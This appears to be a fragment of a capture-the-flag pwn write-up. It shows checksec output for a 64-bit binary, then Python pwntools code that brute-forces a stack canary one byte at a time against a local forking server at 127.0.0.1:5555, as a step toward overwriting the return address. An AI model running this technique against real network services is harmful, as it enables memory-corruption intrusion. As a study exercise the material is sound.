    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

#### [获取canary](http://0x48.pw/2017/03/14/0x2d/)
    canary = "\x00"
    padding = "a"*104 # bzero(&msg, 100uLL);
    for x in xrange(7):
        for y in xrange(256):
            p = remote("127.0.0.1", 5555)
            print p.recv()
            p.send(padding + canary + chr(y))
            try:
                info = p.recv()
                print info
            except:
                p.close()
                continue
            p.close()
            break
        canary += chr(y)
    canary = int(canary.encode('hex'), 16)

#### canary -> ebp -> ret